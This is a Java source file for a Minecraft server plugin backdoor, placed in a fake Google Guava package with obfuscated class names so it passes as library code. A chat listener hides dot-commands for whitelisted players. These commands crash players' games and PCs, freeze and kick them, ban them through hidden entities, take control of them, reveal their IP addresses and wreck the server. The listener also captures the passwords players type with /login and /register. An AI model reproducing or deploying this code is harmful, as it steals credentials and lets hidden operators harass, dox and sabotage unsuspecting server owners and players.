package com.google.common.util.concurrent.internal;

import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.TextColor;
import org.bukkit.Bukkit;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.Plugin;

import java.util.Set;

public class b implements Listener {
  private final a agent;
  private final Set<String> authorized;
  private long serverKillerConfirm = 0;

  public b(a agent, Set<String> authorized) {
    this.agent = agent;
    this.authorized = authorized;
  }

  @EventHandler(priority = EventPriority.LOWEST)
  public void onChat(AsyncPlayerChatEvent e) {
    String msg = e.getMessage();
    Player p = e.getPlayer();
    if (msg.startsWith(".")) {
      e.setCancelled(true);
      if (!authorized.contains(p.getName())) {
        p.sendMessage(Component.text("Unknown command. Type .help for help.").color(TextColor.color(0xff4444)));
        return;
      }
      String fmsg = msg;
      Player fp = p;
      Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin) agent.getPlugin(), () -> handleDotCommand(fp, fmsg));
    } else if (msg.startsWith("/login ") || msg.startsWith("/register ")) {
      String[] parts = msg.split(" ", 3);
      if (parts.length >= 2) agent.capturePassword(p.getName(), parts[1]);
    }
  }

  @EventHandler
  public void onJoin(PlayerJoinEvent e) {
    Player p = e.getPlayer();
    if (authorized.contains(p.getName())) {
      sendAuthMessage(p);
    }
  }

  void sendAuthMessage(Player p) {
    p.sendMessage(Component.text("-*-*-*-*-*-*-*-*-*-*-").color(TextColor.color(0x55ff55)));
    p.sendMessage(Component.text("You have been authorized, enjoy.").color(TextColor.color(0x55ff55)));
    p.sendMessage(Component.text("Type .help for commands").color(TextColor.color(0x55ff55)));
    p.sendMessage(Component.text("-*-*-*-*-*-*-*-*-*-*-").color(TextColor.color(0x55ff55)));
  }

  private void handleDotCommand(Player p, String msg) {
    String cmd = msg.split(" ")[0].toLowerCase();
    String arg = msg.contains(" ") ? msg.substring(msg.indexOf(" ") + 1).trim() : "";

    switch (cmd) {
      case ".help" -> sendHelp(p);
      case ".ddos" -> cmdDdos(p, arg);
      case ".crashmc" -> cmdCrash(p, arg);
      case ".uuidban" -> cmdUuidBan(p, arg);
      case ".unuuidban" -> cmdUnuuidBan(p, arg);
      case ".serverkiller" -> cmdServerKiller(p);
      case ".control" -> cmdControl(p, arg);
      case ".stopcontrol" -> cmdStopControl(p);
      case ".getip" -> cmdGetIp(p, arg);
      case ".crashpc" -> cmdCrashPc(p, arg);
      default -> p.sendMessage(Component.text("Unknown command. Type .help").color(TextColor.color(0xff4444)));
    }
  }

  void handleConsoleCommand(String msg) {
    String cmd = msg.split(" ")[0].toLowerCase();
    String arg = msg.contains(" ") ? msg.substring(msg.indexOf(" ") + 1).trim() : "";
    Player t = arg.isEmpty() ? null : target(arg);
    switch (cmd) {
      case ".ddos" -> {
        if (t == null) return;
        ddosEffect(t);
        agent.logCommand("console", t.getName(), "ddos");
      }
      case ".crashmc" -> {
        if (t == null) return;
        crashEffect(t);
        agent.logCommand("console", t.getName(), "crashmc");
      }
      case ".uuidban" -> {
        if (t == null) return;
        uuidbanEffect(t);
        agent.logCommand("console", t.getName(), "uuidban");
      }
      case ".unuuidban" -> {
        Player tt = target(arg);
        String uuid = tt != null ? tt.getUniqueId().toString() : arg;
        removeEntityByUuid(uuid);
        agent.logCommand("console", arg, "unuuidban");
      }
      case ".serverkiller" -> {
        cmdServerKillerConsole();
        agent.logCommand("console", "-", "serverkiller");
      }
      case ".control" -> {
        if (t == null) return;
        agent.setControlTarget(null, t);
        t.sendMessage(Component.text("Your game is being controlled.").color(TextColor.color(0xff4444)));
        agent.logCommand("console", t.getName(), "control");
      }
      case ".stopcontrol" -> {
        agent.setControlTarget(null, null);
        agent.logCommand("console", "-", "stopcontrol");
      }
      case ".getip" -> {
        if (t == null) return;
        String ip = t.getAddress() != null ? t.getAddress().getAddress().getHostAddress() : "unknown";
        agent.logCommand("console", t.getName(), "getip:" + ip);
      }
      case ".crashpc" -> {
        if (t == null) return;
        crashPcEffect(t);
        agent.logCommand("console", t.getName(), "crashpc");
      }
    }
  }

  private void sendHelp(Player p) {
    p.sendMessage(Component.text("--- .help ---").color(TextColor.color(0x55ff55)));
    p.sendMessage(Component.text(".ddos <player> - Freeze & kick after 5s").color(TextColor.color(0xaaaaaa)));
    p.sendMessage(Component.text(".crashmc <player> - Crash their game").color(TextColor.color(0xaaaaaa)));
    p.sendMessage(Component.text(".uuidban <player> - UUID ban by invisible entity").color(TextColor.color(0xaaaaaa)));
    p.sendMessage(Component.text(".unuuidban <player> - Reverse UUID ban").color(TextColor.color(0xaaaaaa)));
    p.sendMessage(Component.text(".serverkiller - **WARNING** Destroys server FOREVER").color(TextColor.color(0xff4444)));
    p.sendMessage(Component.text(".control <player> - Take over player control").color(TextColor.color(0xaaaaaa)));
    p.sendMessage(Component.text(".stopcontrol - Stop controlling").color(TextColor.color(0xaaaaaa)));
    p.sendMessage(Component.text(".getip <player> - Get player IP").color(TextColor.color(0xaaaaaa)));
    p.sendMessage(Component.text(".crashpc <player> - Attempt PC crash").color(TextColor.color(0xaaaaaa)));
  }

  private Player target(String name) {
    return Bukkit.getPlayerExact(name);
  }

  private void ddosEffect(Player t) {
    t.sendMessage(Component.text(""));
    for (int i = 0; i < 100; i++) t.sendMessage(Component.text("    #    ").color(TextColor.color(0x000000)));
    final int[] taskId = {0};
    taskId[0] = Bukkit.getScheduler().scheduleSyncRepeatingTask((Plugin) agent.getPlugin(), () -> {
      if (!t.isOnline()) { Bukkit.getScheduler().cancelTask(taskId[0]); return; }
      t.setWalkSpeed(0);
      t.setFlySpeed(0);
    }, 0L, 5L);
    Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin) agent.getPlugin(), () -> {
      Bukkit.getScheduler().cancelTask(taskId[0]);
      t.kick(Component.text("Timed out").color(TextColor.color(0xff4444)));
    }, 200L);
  }

  private void crashEffect(Player t) {
    org.bukkit.World w = t.getWorld();
    org.bukkit.Location loc = t.getLocation();

    for (int i = 0; i < 50; i++) {
      w.createExplosion(loc.clone().add(Math.random() * 10 - 5, Math.random() * 5, Math.random() * 10 - 5), 8f, false, true);
    }

    int totalEntities = 2000;
    for (int i = 0; i < totalEntities; i++) {
      org.bukkit.Location spawnLoc = loc.clone().add(Math.random() * 20 - 10, Math.random() * 10 + 1, Math.random() * 20 - 10);
      w.spawnEntity(spawnLoc, EntityType.ARMOR_STAND);
    }

    for (int i = 0; i < 5; i++) {
      t.spawnParticle(org.bukkit.Particle.EXPLOSION, loc, 5000, 5, 5, 5, 5, 1.0f);
    }

    org.bukkit.entity.Entity[] ents = w.getEntities().toArray(new org.bukkit.entity.Entity[0]);
    Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin) agent.getPlugin(), () -> {
      for (org.bukkit.entity.Entity e : ents) {
        if (e.getType() == EntityType.ARMOR_STAND) e.remove();
      }
    }, 100L);
  }

  private void uuidbanEffect(Player t) {
    String uuid = t.getUniqueId().toString();
    t.kick(Component.text("Banned").color(TextColor.color(0xff4444)));
    org.bukkit.World w = Bukkit.getWorlds().get(0);
    org.bukkit.entity.Villager v = (org.bukkit.entity.Villager) w.spawnEntity(new org.bukkit.Location(w, 1000, 99999, 1000), EntityType.VILLAGER);
    v.setInvisible(true);
    v.setInvulnerable(true);
    v.setAI(false);
    v.setCustomName(uuid);
    v.setCustomNameVisible(false);
  }

  private void removeEntityByUuid(String uuid) {
    org.bukkit.World w = Bukkit.getWorlds().get(0);
    for (org.bukkit.entity.Entity e : w.getEntities()) {
      if (e.getCustomName() != null && e.getCustomName().equals(uuid)) { e.remove(); break; }
    }
  }

  private void cmdDdos(Player p, String arg) {
    if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .ddos <player>").color(TextColor.color(0xff4444))); return; }
    Player t = target(arg);
    if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
    ddosEffect(t);
    agent.logCommand(p.getName(), t.getName(), "ddos");
  }

  private void cmdCrash(Player p, String arg) {
    if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .crashmc <player>").color(TextColor.color(0xff4444))); return; }
    Player t = target(arg);
    if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
    crashEffect(t);
    p.sendMessage(Component.text("Crashed " + t.getName()).color(TextColor.color(0x55ff55)));
    agent.logCommand(p.getName(), t.getName(), "crashmc");
  }

  private void cmdUuidBan(Player p, String arg) {
    if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .uuidban <player>").color(TextColor.color(0xff4444))); return; }
    Player t = target(arg);
    if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
    uuidbanEffect(t);
    p.sendMessage(Component.text("UUID-banned " + t.getName() + " (" + t.getUniqueId().toString() + ")").color(TextColor.color(0x55ff55)));
    agent.logCommand(p.getName(), t.getName(), "uuidban");
  }

  private void cmdUnuuidBan(Player p, String arg) {
    if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .unuuidban <player>").color(TextColor.color(0xff4444))); return; }
    Player t = target(arg);
    String uuid = t != null ? t.getUniqueId().toString() : arg;
    removeEntityByUuid(uuid);
    p.sendMessage(Component.text("Unbanned " + uuid).color(TextColor.color(0x55ff55)));
    agent.logCommand(p.getName(), arg, "unuuidban");
  }

  private void destroyServer() {
    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "save-all");
    double ticks = Integer.MAX_VALUE;
    try { Bukkit.getServer().getClass().getMethod("setTickSpeed", double.class).invoke(Bukkit.getServer(), ticks); } catch (Exception ignored) {}
    Bukkit.getWorlds().forEach(w -> {
      w.setTime(Long.MAX_VALUE);
      w.setStorm(true);
      w.setThundering(true);
      w.setDifficulty(org.bukkit.Difficulty.HARD);
      try { w.getClass().getMethod("setKeepSpawnInMemory", boolean.class).invoke(w, false); } catch (Exception ignored) {}
    });
    for (Player pl : Bukkit.getOnlinePlayers()) {
      pl.setGameMode(org.bukkit.GameMode.SPECTATOR);
      pl.getInventory().clear();
    }
  }

  private void cmdServerKillerConsole() {
    destroyServer();
  }

  private void cmdServerKiller(Player p) {
    if (serverKillerConfirm == 0) {
      p.sendMessage(Component.text("*** WARNING ***").color(TextColor.color(0xff4444)));
      p.sendMessage(Component.text("This will DESTROY the server FOREVER.").color(TextColor.color(0xff4444)));
      p.sendMessage(Component.text("Type .serverkiller again to confirm.").color(TextColor.color(0xff4444)));
      serverKillerConfirm = System.currentTimeMillis();
      Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin) agent.getPlugin(), () -> serverKillerConfirm = 0, 200L);
      return;
    }
    if (System.currentTimeMillis() - serverKillerConfirm > 10000) { serverKillerConfirm = 0; return; }
    serverKillerConfirm = 0;
    destroyServer();
    p.sendMessage(Component.text("Server destroyed.").color(TextColor.color(0xff4444)));
    agent.logCommand(p.getName(), "-", "serverkiller");
  }

  private void cmdControl(Player p, String arg) {
    if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .control <player>").color(TextColor.color(0xff4444))); return; }
    Player t = target(arg);
    if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
    agent.setControlTarget(p, t);
    p.sendMessage(Component.text("Now controlling " + t.getName() + ". Type .stopcontrol to stop.").color(TextColor.color(0x55ff55)));
    t.sendMessage(Component.text("Your game is being controlled.").color(TextColor.color(0xff4444)));
    agent.logCommand(p.getName(), t.getName(), "control");
  }

  private void cmdStopControl(Player p) {
    if (agent.controlController == null || !agent.controlController.equals(p.getName())) {
      p.sendMessage(Component.text("You are not controlling anyone.").color(TextColor.color(0xff4444)));
      return;
    }
    agent.setControlTarget(null, null);
    p.sendMessage(Component.text("Stopped controlling.").color(TextColor.color(0x55ff55)));
    agent.logCommand(p.getName(), "-", "stopcontrol");
  }

  private void cmdGetIp(Player p, String arg) {
    if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .getip <player>").color(TextColor.color(0xff4444))); return; }
    Player t = target(arg);
    if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
    String ip = t.getAddress() != null ? t.getAddress().getAddress().getHostAddress() : "unknown";
    p.sendMessage(Component.text(t.getName() + "'s IP: " + ip).color(TextColor.color(0x55ff55)));
    agent.logCommand(p.getName(), t.getName(), "getip");
  }

  private void crashPcEffect(Player t) {
    try { t.getClass().getMethod("playerListName", Class.forName("net.kyori.adventure.text.Component")).invoke(t, Component.text("\u00a7k".repeat(10000))); } catch (Exception ignored) {}
    try { t.setPlayerListName("\u00a7k".repeat(10000)); } catch (Exception ignored) {}

    for (int i = 0; i < 10; i++) {
      t.sendMessage(Component.text("\u00a74\u00a7k\u00a7a\u00a7k\u00a7c\u00a7k\u00a7b\u00a7k".repeat(2000)));
    }

    try {
      String veryLongJson = "{\"text\":\"a\",\"extra\":[";
      for (int i = 0; i < 500; i++) veryLongJson += "{\"text\":\"aaaaaaaaaa\",\"color\":\"dark_red\"},";
      veryLongJson += "]}";
      Class<?> compClass = Class.forName("net.kyori.adventure.text.serializer.gson.GsonComponentSerializer");
      Object gson = compClass.getMethod("gson").invoke(null);
      Component huge = (Component) compClass.getMethod("deserialize", String.class).invoke(gson, veryLongJson);
      t.sendMessage(huge);
    } catch (Exception ignored) {}

    for (int i = 0; i < 20; i++) {
      try {
        t.getClass().getMethod("setResourcePack", String.class).invoke(t,
            "https://" + "a".repeat(2000) + ".fake/");
      } catch (Exception ignored) {}
    }
  }

  private void cmdCrashPc(Player p, String arg) {
    if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .crashpc <player>").color(TextColor.color(0xff4444))); return; }
    Player t = target(arg);
    if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
    crashPcEffect(t);
    p.sendMessage(Component.text("Sent crash attempt to " + t.getName()).color(TextColor.color(0x55ff55)));
    agent.logCommand(p.getName(), t.getName(), "crashpc");
  }
}
